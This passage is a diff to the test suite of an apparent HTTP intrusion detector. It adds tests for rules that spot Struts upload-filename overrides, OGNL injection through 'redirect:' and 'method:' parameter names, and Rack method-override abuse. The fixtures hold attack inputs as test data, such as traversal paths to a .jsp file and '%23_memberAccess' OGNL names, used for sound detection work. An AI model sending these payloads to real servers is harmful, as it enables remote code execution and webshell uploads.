@@ -2228,7 +2228,9 @@ def test_struts_attack_dedup():
           hw.ATTACK_CODES == {"HTTP-080", "HTTP-081", "HTTP-082", "HTTP-083",
                               "HTTP-084", "HTTP-085", "HTTP-086", "HTTP-087",
                               "HTTP-088", "HTTP-089", "HTTP-090", "HTTP-091",
-                              "HTTP-092"})
+                              "HTTP-092", "HTTP-093", "HTTP-094",
+                              "HTTP-095", "HTTP-096", "HTTP-097",
+                              "HTTP-098", "HTTP-099"})
     check("attack dedup: and no posture code is",
           not (hw.ATTACK_CODES & {"HTTP-045", "HTTP-048", "HTTP-060"}))
 
@@ -2251,7 +2253,7 @@ def test_struts_attack_dedup():
           w3.stats["attacks_suppressed"] == 2)
 
 def test_registry():
-    check("registry: 42 codes", len(hw.FINDING_REGISTRY) == 42)
+    check("registry: 49 codes", len(hw.FINDING_REGISTRY) == 49)
     for code, d in hw.FINDING_REGISTRY.items():
         check(f"registry: {code} code matches key", d.code == code)
         check(f"registry: {code} has a summary", len(d.summary) > 20)
@@ -4320,6 +4322,1448 @@ def test_lookup_registry():
           hw.CVE_CATALOG["CVE-2022-42889"]["kev"] is False)
     check("Log4Shell is recorded as KEV with its date",
           hw.CVE_CATALOG["CVE-2021-44228"]["kev_added"] == "2021-12-10")
+
+
+
+# ---------------------------------------------------------------------------
+# HTTP-093 / 094 / 095: the Struts parameter-name rules. Every decoding
+# claim here is a measurement - Commons FileUpload 1.5 for the multipart
+# side, the JDK's URLDecoder and Character methods for the rest.
+# ---------------------------------------------------------------------------
+def _st_mp(parts, boundary=b"----pb", method=b"POST",
+           target=b"/upload.action"):
+    body = b""
+    for h, v in parts:
+        body += b"--" + boundary + b"\r\n" + h + b"\r\n\r\n" + v + b"\r\n"
+    body += b"--" + boundary + b"--\r\n"
+    return (method + b" " + target + b" HTTP/1.1\r\nHost: v\r\n"
+            b"Content-Type: multipart/form-data; boundary=" + boundary
+            + b"\r\nContent-Length: " + str(len(body)).encode()
+            + b"\r\n\r\n" + body)
+
+
+def _st_file(name, fn=b"a.txt", val=b"DATA"):
+    return (b'Content-Disposition: form-data; name="' + name
+            + b'"; filename="' + fn + b'"\r\nContent-Type: text/plain', val)
+
+
+def _st_field(name, val=b"x"):
+    return (b'Content-Disposition: form-data; name="' + name + b'"', val)
+
+
+def _st_query(q, target=b"/x.action"):
+    return b"GET " + target + b"?" + q + b" HTTP/1.1\r\nHost: v\r\n\r\n"
+
+
+def _st_urlenc(body, target=b"/x.action"):
+    return (b"POST " + target + b" HTTP/1.1\r\nHost: v\r\n"
+            b"Content-Type: application/x-www-form-urlencoded\r\n"
+            b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body)
+
+
+def _st_codes(raw):
+    return {f.code for f in _ex(raw)}
+
+
+def _st_find(raw, code):
+    for f in _ex(raw):
+        if f.code == code:
+            return f
+    return None
+
+
+def test_servlet_decode():
+    """Servlet parameter decoding, measured against the JDK's URLDecoder in
+    both UTF-8 and ISO-8859-1."""
+    D = hw.servlet_decode
+    check("servlet decode: a percent escape resolves",
+          D(b"redirect:%24%7Bx%7D") == b"redirect:${x}")
+    check("servlet decode: '+' is a space",
+          D(b"a+b") == b"a b")
+    check("servlet decode: %20 is a space", D(b"a%20b") == b"a b")
+    check("servlet decode: lowercase hex works", D(b"%7b") == b"{")
+    check("servlet decode: a plain name is unchanged",
+          D(b"action:save") == b"action:save")
+    # the double-encoding case the preflight calls out: Struts sees %24{,
+    # not ${, so this must not become an attack
+    check("servlet decode: double-encoding yields %24{ and not ${",
+          D(b"redirect:%2524%7Bx%7D") == b"redirect:%24{x}")
+    check("servlet decode: double-encoded %23 yields %23 and not #",
+          D(b"method:%2523x") == b"method:%23x")
+    # a malformed escape makes URLDecoder THROW, so the container never
+    # hands Struts a parameter at all. None means "no such parameter".
+    for bad in (b"%ZZ", b"100%", b"%", b"%A", b"a%GG b", b"x%2"):
+        check(f"servlet decode: a malformed escape {bad!r} yields no "
+              f"parameter", D(bad) is None)
+    # neither charset can manufacture an ASCII token, which is why the
+    # charset choice provably cannot change a verdict here
+    check("servlet decode: a non-ASCII byte cannot manufacture an opener",
+          hw.STRUTS_OGNL_OPENERS[0] not in (D(b"%E2%82%AC") or b""))
+
+
+def test_fileupload_disposition_params():
+    """Content-Disposition as Commons FileUpload 1.5 reads it.
+
+    Three measured divergences from php_disposition_params, each of which
+    would be wrong in a different direction if the PHP profile were reused.
+    """
+    F = hw.fileupload_disposition_params
+    check("fileupload: the quoted form parses",
+          F(b'form-data; name="Upload"; filename="a.txt"')[b"name"]
+          == b"Upload")
+    check("fileupload: an unquoted value parses",
+          F(b"form-data; name=Upload; filename=a.txt")[b"name"] == b"Upload")
+    # divergence 1: a single quote does NOT quote, unlike PHP
+    check("fileupload: a single quote is NOT a quoting character",
+          F(b"form-data; name='Upload'; filename='a.txt'")[b"name"]
+          == b"'Upload'")
+    # divergence 2: OWS before '=' IS accepted, unlike PHP
+    check("fileupload: OWS before '=' is accepted",
+          F(b'form-data; name ="Upload"; filename ="a.txt"')[b"name"]
+          == b"Upload")
+    check("fileupload: OWS after '=' is accepted",
+          F(b'form-data; name= "Upload"')[b"name"] == b"Upload")
+    # divergence 3: name*= with no plain name drops the part entirely
+    check("fileupload: name*= alone drops the part",
+          F(b"form-data; name*=UTF-8''Upload; filename=\"a.txt\"") is None)
+    check("fileupload: name*= beside a plain name is ignored",
+          F(b'form-data; name="dummy"; name*=UTF-8\'\'Upload;'
+            b' filename="a.txt"')[b"name"] == b"dummy")
+    # agreements with the PHP profile
+    # Measured: the jar does NOT unescape. A backslash stops the next
+    # character from closing the quoted string and then stays in the value,
+    # which is the fourth place this decoder differs from PHP's.
+    check("fileupload: a backslash keeps a quote from closing the string, "
+          "and stays in the value",
+          F(b'form-data; name="Up\\"load"')[b"name"] == b'Up\\"load')
+    check("fileupload: a lone backslash stays literal",
+          F(b'form-data; name="Up\\load"')[b"name"] == b"Up\\load")
+    check("fileupload: a trailing backslash is kept and the unterminated "
+          "quote tolerated",
+          F(b'form-data; name="Upload\\"')[b"name"] == b"Upload\\")
+    check("fileupload: this is NOT how the PHP profile reads it",
+          hw.php_disposition_params(b'form-data; name="Up\\"load"')[0][b"name"]
+          == b'Up"load')
+    check("fileupload: the last duplicate name wins",
+          F(b'form-data; name="first"; name="second"')[b"name"] == b"second")
+    check("fileupload: the last duplicate filename wins",
+          F(b'form-data; name="U"; filename="one"; filename="two"')[b"filename"]
+          == b"two")
+    check("fileupload: parameter names fold case",
+          F(b'form-data; NAME="Upload"; FILENAME="a.txt"')[b"name"]
+          == b"Upload")
+    check("fileupload: filename* is ignored",
+          F(b'form-data; name="U"; filename="d.txt";'
+            b" filename*=UTF-8''%E2%82%AC.txt")[b"filename"] == b"d.txt")
+    check("fileupload: a quoted semicolon stays in the value",
+          F(b'form-data; name="a;b"')[b"name"] == b"a;b")
+    check("fileupload: a dotted name is preserved",
+          F(b'form-data; name="user.avatar"')[b"name"] == b"user.avatar")
+    # an empty filename is still a filename parameter, so still a file part
+    check("fileupload: an empty filename is still present",
+          F(b'form-data; name="U"; filename=""') .get(b"filename") == b"")
+
+
+def test_fileupload_part_split():
+    """Which parts are files and which are fields, as the jar decides."""
+    parts, _ = hw.parse_multipart(
+        _st_mp([_st_file(b"Upload"), _st_field(b"desc")]).split(b"\r\n\r\n", 1)[1],
+        b"----pb")
+    files, fields = hw.fileupload_part_names(parts)
+    check("part split: the file part is a file", files == [b"Upload"])
+    check("part split: the plain part is a field",
+          [n for _, n in fields] == [b"desc"])
+    # measured: filename="" still yields isFormField()==false
+    parts, _ = hw.parse_multipart(
+        _st_mp([_st_file(b"Upload", b"")]).split(b"\r\n\r\n", 1)[1], b"----pb")
+    files, fields = hw.fileupload_part_names(parts)
+    check("part split: an empty filename is still a file part",
+          files == [b"Upload"] and not fields)
+    # a part the jar drops contributes neither
+    parts, _ = hw.parse_multipart(
+        _st_mp([(b"Content-Disposition: form-data; name*=UTF-8''Upload; "
+                 b'filename="a.txt"\r\nContent-Type: text/plain', b"D")]
+               ).split(b"\r\n\r\n", 1)[1], b"----pb")
+    files, fields = hw.fileupload_part_names(parts)
+    check("part split: a dropped part contributes nothing",
+          not files and not fields)
+
+
+def test_struts_param_leaf():
+    """The OGNL leaf: a trailing [n] stripped, then the segment after the
+    last dot. This is what makes the two attacker variations equivalent."""
+    L = hw.struts_param_leaf
+    for src, want in [
+        (b"uploadFileName", b"uploadFileName"),
+        (b"top.UploadFileName", b"UploadFileName"),
+        (b"[0].UploadFileName", b"UploadFileName"),
+        (b"a.b.c.UploadFileName", b"UploadFileName"),
+        (b"x.avatarFileName", b"avatarFileName"),
+        (b"UploadFileName[0]", b"UploadFileName"),
+        (b"top.UploadFileName[12]", b"UploadFileName"),
+        (b"docFileNameHint", b"docFileNameHint"),
+        (b"", b""),
+        (b".", b""),
+    ]:
+        check(f"struts leaf: {src!r} -> {want!r}", L(src) == want)
+
+
+def test_http_093_positives():
+    for label, parts in [
+        ("the S2-067 PoC",
+         [_st_file(b"Upload"), _st_field(b"top.UploadFileName", b"../../x.jsp")]),
+        ("the S2-066 case variant",
+         [_st_file(b"Upload"), _st_field(b"uploadFileName", b"../../x.jsp")]),
+        ("a ContentType override",
+         [_st_file(b"Upload"), _st_field(b"UploadContentType", b"text/x")]),
+        ("an all-caps property",
+         [_st_file(b"Upload"), _st_field(b"UPLOADFILENAME", b"x.jsp")]),
+        ("a [0]. prefix",
+         [_st_file(b"Upload"), _st_field(b"[0].UploadFileName", b"x.jsp")]),
+        ("a deep OGNL prefix",
+         [_st_file(b"Upload"), _st_field(b"a.b.UploadFileName", b"x.jsp")]),
+        ("a dotted file field",
+         [_st_file(b"user.avatar"), _st_field(b"x.avatarFileName", b"x.jsp")]),
+        ("an empty filename on the file part",
+         [_st_file(b"Upload", b""), _st_field(b"UploadFileName", b"x.jsp")]),
+        ("the override before the file part",
+         [_st_field(b"UploadFileName", b"x.jsp"), _st_file(b"Upload")]),
+        ("a second file part being the target",
+         [_st_file(b"ok"), _st_file(b"Upload"),
+          _st_field(b"UploadFileName", b"x.jsp")]),
+    ]:
+        check(f"HTTP-093 fires on {label}",
+              "HTTP-093" in _st_codes(_st_mp(parts)))
+    # the query-string carrier
+    check("HTTP-093 fires on an override in the query string",
+          "HTTP-093" in _st_codes(_st_mp(
+              [_st_file(b"Upload")],
+              target=b"/upload.action?top.UploadFileName=../../x.jsp")))
+    check("HTTP-093 fires on a percent-encoded query override",
+          "HTTP-093" in _st_codes(_st_mp(
+              [_st_file(b"Upload")],
+              target=b"/upload.action?top.UploadFileName=%2E%2E%2Fx.jsp")))
+
+
+def test_http_093_negatives():
+    for label, parts in [
+        ("a normal upload with text fields",
+         [_st_file(b"Upload"), _st_field(b"description", b"hello"),
+          _st_field(b"token", b"abc")]),
+        ("a lookalike field name",
+         [_st_file(b"doc"), _st_field(b"docFileNameHint", b"x")]),
+        ("a field that only shares a suffix",
+         [_st_file(b"Upload"), _st_field(b"OtherFileName", b"x")]),
+        ("a field naming a property of no file part",
+         [_st_file(b"Upload"), _st_field(b"avatarFileName", b"x")]),
+        ("the file part's own name repeated",
+         [_st_file(b"Upload"), _st_field(b"Upload", b"x")]),
+        ("a field whose leaf merely contains the property",
+         [_st_file(b"Upload"), _st_field(b"xUploadFileName", b"x")]),
+        ("a part the jar drops",
+         [(b"Content-Disposition: form-data; name*=UTF-8''Upload; "
+           b'filename="a.txt"\r\nContent-Type: text/plain', b"D"),
+          _st_field(b"UploadFileName", b"x.jsp")]),
+        ("no file part at all",
+         [_st_field(b"desc", b"x"), _st_field(b"UploadFileName", b"x.jsp")]),
+    ]:
+        check(f"HTTP-093 silent on {label}",
+              "HTTP-093" not in _st_codes(_st_mp(parts)))
+    # a urlencoded request with the name but no file part
+    check("HTTP-093 silent on urlencoded uploadFileName with no file part",
+          "HTTP-093" not in _st_codes(_st_urlenc(b"uploadFileName=../../x.jsp")))
+    # file CONTENT is never inspected
+    check("HTTP-093 never inspects file content",
+          "HTTP-093" not in _st_codes(_st_mp(
+              [_st_file(b"Upload", b"a.txt", b"UploadFileName=../../x.jsp")])))
+
+
+def test_http_093_evidence():
+    f = _st_find(_st_mp([_st_file(b"Upload"),
+                         _st_field(b"top.UploadFileName",
+                                   b"../../webapps/ROOT/x.jsp")]), "HTTP-093")
+    e = f.evidence
+    check("HTTP-093 names the file field", e["file_field"] == "Upload")
+    check("HTTP-093 names the overridden property",
+          e["overridden_property"] == "uploadfilename")
+    check("HTTP-093 reports the property kind",
+          e["property_kind"] == "FileName")
+    check("HTTP-093 marks the OGNL prefix", e["prefixed"] is True)
+    check("HTTP-093 lists the file fields", e["file_fields"] == ["Upload"])
+    check("HTTP-093 flags traversal", e["traversal"] is True)
+    check("HTTP-093 flags a jsp target", e["jsp_target"] is True)
+    check("HTTP-093 escalates to critical", e["severity_class"] == "critical")
+    check("HTTP-093 digests the value",
+          e["value_digest"].startswith("sha256:"))
+    check("HTTP-093 does not log the value by default", "payload" not in e)
+    check("HTTP-093 says attempt, not vulnerable",
+          "records an attempt" in e["note"])
+    check("HTTP-093 states that 6.4.0 alone does not settle it",
+          "6.4.0 alone does not settle it" in e["note"])
+    cfg = hw.WatchConfig(log_attack_payload=True)
+    raw = _st_mp([_st_file(b"Upload"),
+                  _st_field(b"UploadFileName", b"../../SECRETMARKER.jsp")])
+    f2 = [x for x in _ex(raw, cfg) if x.code == "HTTP-093"][0]
+    check("HTTP-093 logs the value only when asked",
+          "SECRETMARKER" in f2.evidence.get("payload", ""))
+    f3 = _st_find(raw, "HTTP-093")
+    check("HTTP-093 withholds the value by default",
+          "SECRETMARKER" not in repr(f3.evidence))
+    # escalation is severity only: a plain override still fires
+    f4 = _st_find(_st_mp([_st_file(b"Upload"),
+                          _st_field(b"UploadContentType", b"text/plain")]),
+                  "HTTP-093")
+    check("HTTP-093 fires without traversal, at high",
+          f4 is not None and f4.evidence["severity_class"] == "high"
+          and f4.evidence["traversal"] is False)
+    # absolute paths, both flavours
+    for val, label in [(b"/var/lib/tomcat/x.jsp", "a unix absolute path"),
+                       (b"C:\\inetpub\\x.jsp", "a windows absolute path")]:
+        f5 = _st_find(_st_mp([_st_file(b"Upload"),
+                              _st_field(b"UploadFileName", val)]), "HTTP-093")
+        check(f"HTTP-093 flags {label}",
+              f5 is not None and f5.evidence["absolute_path"] is True)
+
+
+def test_http_094():
+    for label, q in [
+        ("the published redirect:${} PoC", b"redirect:%24%7B%231%7D=1"),
+        ("action:${}", b"action:%24%7Bx%7D=1"),
+        ("redirectAction:%{}", b"redirectAction:%25%7Bx%7D=1"),
+        ("an opener later in the name", b"redirect:/a/b%24%7Bx%7D=1"),
+    ]:
+        check(f"HTTP-094 fires on {label}", "HTTP-094" in _st_codes(_st_query(q)))
+    check("HTTP-094 fires in a urlencoded body",
+          "HTTP-094" in _st_codes(_st_urlenc(b"redirect:%24%7Bx%7D=1")))
+    check("HTTP-094 fires in a multipart field name",
+          "HTTP-094" in _st_codes(_st_mp([_st_field(b"redirect:${x}")])))
+    for label, q in [
+        ("action:save", b"action:save=1"),
+        ("redirect:/login", b"redirect:%2Flogin=1"),
+        ("redirectAction:dashboard", b"redirectAction:dashboard=1"),
+        ("the wrong case", b"Redirect:%24%7Bx%7D=1"),
+        ("all caps", b"REDIRECT:%24%7Bx%7D=1"),
+        ("a double-encoded name", b"redirect:%2524%7Bx%7D=1"),
+        ("an OGNL opener in a value", b"q=%24%7Bx%7D"),
+        ("a malformed escape", b"redirect:%ZZ%7Bx%7D=1"),
+        ("the prefix without a colon", b"redirectx%24%7By%7D=1"),
+        ("an opener but no prefix", b"foo%24%7Bx%7D=1"),
+        # Struts uses startsWith, so a name that merely CONTAINS a prefix
+        # is not a navigation instruction. The bite tier found that nothing
+        # here covered that.
+        ("a name containing but not starting with the prefix",
+         b"x-redirect:%24%7By%7D=1"),
+        ("a prefix embedded in a longer word", b"myaction:%24%7Bx%7D=1"),
+        ("the prefix after a separator in one name",
+         b"q%26redirect:%24%7By%7D=1"),
+    ]:
+        check(f"HTTP-094 silent on {label}",
+              "HTTP-094" not in _st_codes(_st_query(q)))
+    f = _st_find(_st_query(b"redirect:%24%7B%23x.getClass()%7D=1"), "HTTP-094")
+    check("HTTP-094 reports the prefix", f.evidence["prefix"] == "redirect:")
+    check("HTTP-094 reports the opener", f.evidence["opener"] == "${")
+    check("HTTP-094 escalates on code markers",
+          set(f.evidence["code_markers"]) >= {"#", "("}
+          and f.evidence["severity_class"] == "critical")
+    check("HTTP-094 digests the name",
+          f.evidence["param_digest"].startswith("sha256:"))
+    check("HTTP-094 never inspects values", "value" not in f.evidence)
+    # The payload knob is off by default for every attack code. The bite
+    # tier found this asserted for HTTP-093 and nowhere else, so a rule
+    # that logged the name unconditionally escaped every test.
+    check("HTTP-094 does not log the parameter by default",
+          "payload" not in f.evidence)
+    cfg094 = hw.WatchConfig(log_attack_payload=True)
+    raw094 = _st_query(b"redirect:%24%7B%23x.getClass()%7D=1")
+    f094 = [x for x in _ex(raw094, cfg094) if x.code == "HTTP-094"][0]
+    check("HTTP-094 logs the parameter only when asked",
+          "redirect:" in f094.evidence.get("payload", ""))
+    g = _st_find(_st_query(b"redirect:%24%7Bx%7D=1"), "HTTP-094")
+    check("HTTP-094 a bare probe stays high",
+          g.evidence["severity_class"] == "high")
+    check("HTTP-094 prefers the longest prefix",
+          _st_find(_st_query(b"redirectAction:%24%7Bx%7D=1"),
+                   "HTTP-094").evidence["prefix"] == "redirectAction:")
+
+
+def test_http_095():
+    for label, q in [
+        ("the S2-032 PoC", b"method:%23_memberAccess=1"),
+        ("method:#x", b"method:%23x=1"),
+        ("method:a(b)", b"method:a(b)=1"),
+        ("an empty remainder", b"method:=1"),
+        ("method:@x", b"method:%40x=1"),
+        ("a dotted remainder", b"method:a.b=1"),
+        ("a hyphen", b"method:a-b=1"),
+        ("a digit first", b"method:1abc=1"),
+        ("a space inside", b"method:a+b=1"),
+        ("a non-breaking space", "method:a\u00a0b=1".encode()),
+        ("an Arabic-Indic digit first", "method:\u0660x=1".encode()),
+    ]:
+        check(f"HTTP-095 fires on {label}", "HTTP-095" in _st_codes(_st_query(q)))
+    check("HTTP-095 fires in a urlencoded body",
+          "HTTP-095" in _st_codes(_st_urlenc(b"method:%23x=1")))
+    check("HTTP-095 fires in a multipart field name",
+          "HTTP-095" in _st_codes(_st_mp([_st_field(b"method:#x")])))
+    for label, q in [
+        ("method:save", b"method:save=1"),
+        ("method:$init", b"method:%24init=1"),
+        ("method:_x1", b"method:_x1=1"),
+        ("a non-ASCII method name", "method:déjà=1".encode()),
+        ("a digit after the first character", b"method:a1=1"),
+        ("the wrong case", b"Method:%23x=1"),
+        ("a method parameter whose value holds OGNL", b"method=%23x"),
+        ("a zero-width space, a valid identifier part",
+         "method:a\u200bb=1".encode()),
+        ("a combining mark, a valid identifier part",
+         "method:a\u0301=1".encode()),
+        ("an astral letter, a valid identifier start",
+         "method:\U0001D49Ca=1".encode()),
+        ("an Arabic-Indic digit after the first character",
+         "method:x\u0660=1".encode()),
+        ("a malformed escape", b"method:%ZZx=1"),
+        ("a name containing but not starting with method:",
+         b"xmethod:%23x=1"),
+        ("method: embedded after a separator", b"a%26method:%23x=1"),
+    ]:
+        check(f"HTTP-095 silent on {label}",
+              "HTTP-095" not in _st_codes(_st_query(q)))
+    # A double-encoded payload DOES fire here, and that is not an
+    # inconsistency with HTTP-094. S2-016 asks whether Struts would see an
+    # OGNL opener, and after one decode %2524%7B is "%24{", which holds
+    # none - so it cannot fire. S2-032 asks whether the remainder is a
+    # valid Java method name, and "%23x" is not one whatever produced it.
+    # No legitimate DMI client sends that, so there is no false positive to
+    # trade away; a garbled or scanned attempt is still an attempt.
+    check("HTTP-095 fires on a double-encoded hash, which is still not a "
+          "method name", "HTTP-095" in _st_codes(_st_query(b"method:%2523x=1")))
+    check("HTTP-094 stays silent on the same double-encoding, because "
+          "Struts would see no opener",
+          "HTTP-094" not in _st_codes(_st_query(b"redirect:%2524%7Bx%7D=1")))
+    f = _st_find(_st_query(b"method:%23_memberAccess%3Dtrue=1"), "HTTP-095")
+    check("HTTP-095 flags member access", f.evidence["member_access"] is True)
+    check("HTTP-095 escalates to critical",
+          f.evidence["severity_class"] == "critical")
+    check("HTTP-095 never inspects values", "value" not in f.evidence)
+    check("HTTP-095 does not log the parameter by default",
+          "payload" not in f.evidence)
+    cfg095 = hw.WatchConfig(log_attack_payload=True)
+    f095 = [x for x in _ex(_st_query(b"method:%23_memberAccess=1"), cfg095)
+            if x.code == "HTTP-095"][0]
+    check("HTTP-095 logs the parameter only when asked",
+          "method:" in f095.evidence.get("payload", ""))
+    check("HTTP-095 marks an empty remainder",
+          _st_find(_st_query(b"method:=1"), "HTTP-095")
+          .evidence["empty_remainder"] is True)
+    g = _st_find(_st_query(b"method:a-b=1"), "HTTP-095")
+    check("HTTP-095 a non-identifier with no code marker stays high",
+          g.evidence["severity_class"] == "high"
+          and g.evidence["code_markers"] == [])
+    # an undecodable remainder is reported as such, not silently judged
+    h = _st_find(b"GET /x.action?method:\xff\xfe=1 HTTP/1.1\r\nHost: v\r\n\r\n",
+                 "HTTP-095")
+    check("HTTP-095 reports an undecodable remainder honestly",
+          h is not None and h.evidence["undecodable"] is True)
+
+
+def test_java_identifier_predicate():
+    """Java's predicate, not Python's.
+
+    str.isidentifier() disagrees in both directions: Java accepts '$' as a
+    start where Python does not, and accepts U+200B as a PART where Python
+    does not. Held against the JDK's own Character methods in the xcheck
+    tier over every fixture code point.
+    """
+    I = hw.is_java_identifier
+    for text, want in [
+        ("save", True), ("$init", True), ("_x1", True), ("a1", True),
+        ("d\u00e9j\u00e0", True), ("a\u200bb", True), ("a\u0301", True),
+        ("\U0001D49Ca", True), ("x\u0660", True), ("$", True), ("_", True),
+        ("", False), ("#x", False), ("a(b)", False), ("@x", False),
+        ("1abc", False), ("a\u00a0b", False), ("a.b", False),
+        ("a-b", False), ("a b", False), ("\u0660x", False),
+        ("#_memberAccess", False),
+    ]:
+        check(f"java identifier: {text!r} -> {want}", I(text) == want)
+    # the two places Python's own predicate differs, pinned so a future
+    # refactor cannot quietly swap in str.isidentifier()
+    check("java identifier: '$init' differs from Python's predicate",
+          I("$init") is True and "$init".isidentifier() is False)
+    check("java identifier: a zero-width space differs from Python's",
+          I("a\u200bb") is True and "a\u200bb".isidentifier() is False)
+    check("java identifier: start and part differ for a digit",
+          hw.java_identifier_part(ord("1")) is True
+          and hw.java_identifier_start(ord("1")) is False)
+    check("java identifier: '$' is both start and part",
+          hw.java_identifier_start(ord("$"))
+          and hw.java_identifier_part(ord("$")))
+
+
+def test_struts_h2c():
+    """HTTP-094 and HTTP-095 read names only, so h2c costs nothing.
+
+    HTTP-093 is absent on purpose: it needs the multipart file parts to
+    know which properties Struts would have set, and DATA frames reach no
+    body sink.
+    """
+    def drive_h2(path):
+        st = hw.H2ConnectionState("h2s", synced=True)
+        blk = (_hpack_literal(b":method", b"GET")
+               + _hpack_literal(b":authority", b"v")
+               + _hpack_literal(b":path", path))
+        return st.feed([hw.H2Frame(len(blk), hw.FRAME_HEADERS,
+                                   hw.FLAG_END_HEADERS, 1, blk)],
+                       from_client=True, now=1.0)
+    out = drive_h2(b"/x.action?redirect:%24%7Bx%7D=1")
+    check("HTTP-094 h2c: fires on a query name in :path",
+          "HTTP-094" in codes(out))
+    hit = [f for f in out if f.code == "HTTP-094"]
+    check("HTTP-094 h2c: records the transport",
+          hit and hit[0].evidence["transport"] == "h2c")
+    out = drive_h2(b"/x.action?method:%23x=1")
+    check("HTTP-095 h2c: fires on a query name in :path",
+          "HTTP-095" in codes(out))
+    out = drive_h2(b"/x.action?action:save=1&method:save=1")
+    check("the Struts rules stay silent on legitimate h2c names",
+          not ({"HTTP-094", "HTTP-095"} & set(codes(out))))
+    out = drive_h2(b"/upload.action?top.UploadFileName=../../x.jsp")
+    check("HTTP-093 does not fire over h2c, having no file parts",
+          "HTTP-093" not in codes(out))
+
+
+def test_struts_registry():
+    for code, tier, cves in [
+        ("HTTP-093", "F", {"CVE-2024-53677", "CVE-2023-50164"}),
+        ("HTTP-094", "F", {"CVE-2013-2251"}),
+        ("HTTP-095", "F", {"CVE-2016-3081"}),
+    ]:
+        d = hw.FINDING_REGISTRY[code]
+        check(f"{code} is tier {tier}", d.tier == tier)
+        check(f"{code} carries its CVEs", set(d.cves) == cves)
+        check(f"{code} is exact-confidence", d.confidence == "exact")
+    check("HTTP-095 is registered high, matching its 8.1 score",
+          hw.FINDING_REGISTRY["HTTP-095"].severity == "high")
+    check("S2-016 is recorded as KEV with its date",
+          hw.CVE_CATALOG["CVE-2013-2251"]["kev_added"] == "2022-03-25")
+    check("S2-032 is recorded as KEV with its date",
+          hw.CVE_CATALOG["CVE-2016-3081"]["kev_added"] == "2026-10-08")
+    check("neither upload CVE is claimed as KEV",
+          hw.CVE_CATALOG["CVE-2024-53677"]["kev"] is False
+          and hw.CVE_CATALOG["CVE-2023-50164"]["kev"] is False)
+    for cve in ("CVE-2013-2248", "CVE-2016-3087", "CVE-2016-4438"):
+        check(f"{cve} is recorded as deferred", cve in hw.DEFERRED_CVES)
+
+
+# ---------------------------------------------------------------------------
+# HTTP-096: Rack::MethodOverride _method grammar (Ruby2Shell)
+# ---------------------------------------------------------------------------
+DF = b"\xDF"
+_TP = b"text/plain; charset="
+
+
+def _rb_mp(parts, boundary=b"----rb", method=b"POST", target=b"/users/1"):
+    body = b""
+    for h, v in parts:
+        body += b"--" + boundary + b"\r\n" + h + b"\r\n\r\n" + v + b"\r\n"
+    body += b"--" + boundary + b"--\r\n"
+    return (method + b" " + target + b" HTTP/1.1\r\nHost: rails\r\n"
+            b"Content-Type: multipart/form-data; boundary=" + boundary
+            + b"\r\nContent-Length: " + str(len(body)).encode()
+            + b"\r\n\r\n" + body)
+
+
+def _rb_field(name, val, ctype=None):
+    h = b'Content-Disposition: form-data; name="' + name + b'"'
+    if ctype:
+        h += b"\r\nContent-Type: " + ctype
+    return (h, val)
+
+
+def _rb_file(name, val, ctype=b"text/plain; charset=ISO-8859-1"):
+    return (b'Content-Disposition: form-data; name="' + name
+            + b'"; filename="f.txt"\r\nContent-Type: ' + ctype, val)
+
+
+def _rb_urlenc(body, method=b"POST",
+               ctype=b"application/x-www-form-urlencoded"):
+    return (method + b" /users/1 HTTP/1.1\r\nHost: rails\r\nContent-Type: "
+            + ctype + b"\r\nContent-Length: " + str(len(body)).encode()
+            + b"\r\n\r\n" + body)
+
+
+def _f096(raw):
+    for f in _ex(raw):
+        if f.code == "HTTP-096":
+            return f
+    return None
+
+
+def test_096_method_token_grammar():
+    """The token set is RFC 9110 5.6.2, not ASCII letters."""
+    V = hw.method_token_violations
+    check("096 grammar: a plain method is clean", V(b"PUT") == [])
+    check("096 grammar: lower case is still a token", V(b"delete") == [])
+    for m in (b"M-SEARCH", b"PROPFIND", b"X-MS-ENUMATTS", b"PATCH",
+              b"!#$%&'*+-.^_|~`", b"MKCALENDAR", b"VERSION-CONTROL"):
+        check(f"096 grammar: {m.decode()} is a legitimate method token",
+              V(m) == [])
+    check("096 grammar: a space is not a tchar", V(b"PU T") == [0x20])
+    check("096 grammar: a control byte is not a tchar", V(b"PUT\x01") == [1])
+    check("096 grammar: 0xDF is not a tchar", V(DF) == [0xDF])
+    check("096 grammar: violations are reported sorted and deduplicated",
+          V(b"A B\x01B ") == [0x01, 0x20])
+    # the separators RFC 9110 excludes from a token
+    for bad in b'"(),/:;<=>?@[\\]{}':
+        check(f"096 grammar: {chr(bad)!r} is excluded from a token",
+              V(bytes((bad,))) == [bad])
+
+
+def test_096_growing_encodings_are_the_measured_set():
+    """Only the 14 encodings whose upcase of 0xDF grows may escalate."""
+    canon = set(hw.RUBY_GROWING_ENCODINGS.values())
+    check("096 encodings: exactly 14 canonical names", len(canon) == 14)
+    for n in (1, 2, 3, 4, 9, 10, 13, 14, 15, 16):
+        check(f"096 encodings: ISO-8859-{n} grows",
+              ("ISO-8859-%d" % n).encode() in canon)
+    for n in (1250, 1252, 1254, 1257):
+        check(f"096 encodings: Windows-{n} grows",
+              ("Windows-%d" % n).encode() in canon)
+    # The advisory's generic "ISO-8859-x and Windows-125x" is over-broad.
+    # In these the byte 0xDF is not sharp s and the conversion is flat, so
+    # escalating on them would be a false positive.
+    for label in (b"iso-8859-5", b"iso-8859-6", b"iso-8859-7", b"iso-8859-8",
+                  b"iso-8859-11", b"windows-1251", b"windows-1253",
+                  b"windows-1255", b"windows-1256", b"windows-1258",
+                  b"utf-8", b"us-ascii", b"koi8-r", b"shift_jis"):
+        check(f"096 encodings: {label.decode()} must NOT escalate",
+              label not in hw.RUBY_GROWING_ENCODINGS)
+    check("096 encodings: every alias Ruby accepts is present",
+          len(hw.RUBY_GROWING_ENCODINGS) == 28)
+    check("096 encodings: the ISO8859-N alias form resolves",
+          hw.RUBY_GROWING_ENCODINGS.get(b"iso8859-15") == b"ISO-8859-15")
+    check("096 encodings: the CPNNNN alias form resolves",
+          hw.RUBY_GROWING_ENCODINGS.get(b"cp1252") == b"Windows-1252")
+    check("096 encodings: 'latin1' is absent, as Ruby rejects it",
+          b"latin1" not in hw.RUBY_GROWING_ENCODINGS)
+    check("096 encodings: the growing byte is 0xDF", hw.RUBY_GROWING_BYTE == 0xDF)
+
+
+def test_096_rack_part_encoding_parity():
+    """rack_part_encoding against every Rack 2.2.7 measurement."""
+    def enc(ct, name=b"_method", filename=False):
+        disp = b'form-data; name="' + name + b'"'
+        if filename:
+            disp += b'; filename="f.txt"'
+        body = (b"--b\r\nContent-Disposition: " + disp + b"\r\nContent-Type: "
